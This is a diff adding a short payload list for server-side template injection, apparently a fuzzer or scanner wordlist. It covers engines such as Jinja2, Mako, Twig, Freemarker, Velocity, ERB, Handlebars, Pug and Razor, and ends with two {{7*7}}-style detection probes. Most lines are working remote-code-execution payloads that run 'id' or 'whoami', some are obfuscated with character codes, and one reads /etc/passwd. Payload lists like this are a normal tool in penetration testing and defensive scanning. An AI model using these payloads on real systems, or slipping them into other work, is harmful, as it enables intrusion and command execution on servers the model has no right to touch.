@@ -1,0 +1,17 @@
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{{().__class__.__bases__[0].__subclasses__()[59]('id',shell=True,stdout=-1).communicate()[0]}}
+{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
+${self.module.cache.util.os.popen("id").read()}
+${str().join(chr(i)for(i)in[105,100])}
+{chr(105)|cat:chr(100)}
+{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
+${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
+${class.inspect("java.lang.Runtime").type.getRuntime().exec("id").waitFor()}
+<%= system("id") %>
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
+@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
+{% import os %}{{os.system('id')}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('id',shell=True,stdout=-1).communicate()[0]}}
+{{7*7}}
+${7*7}
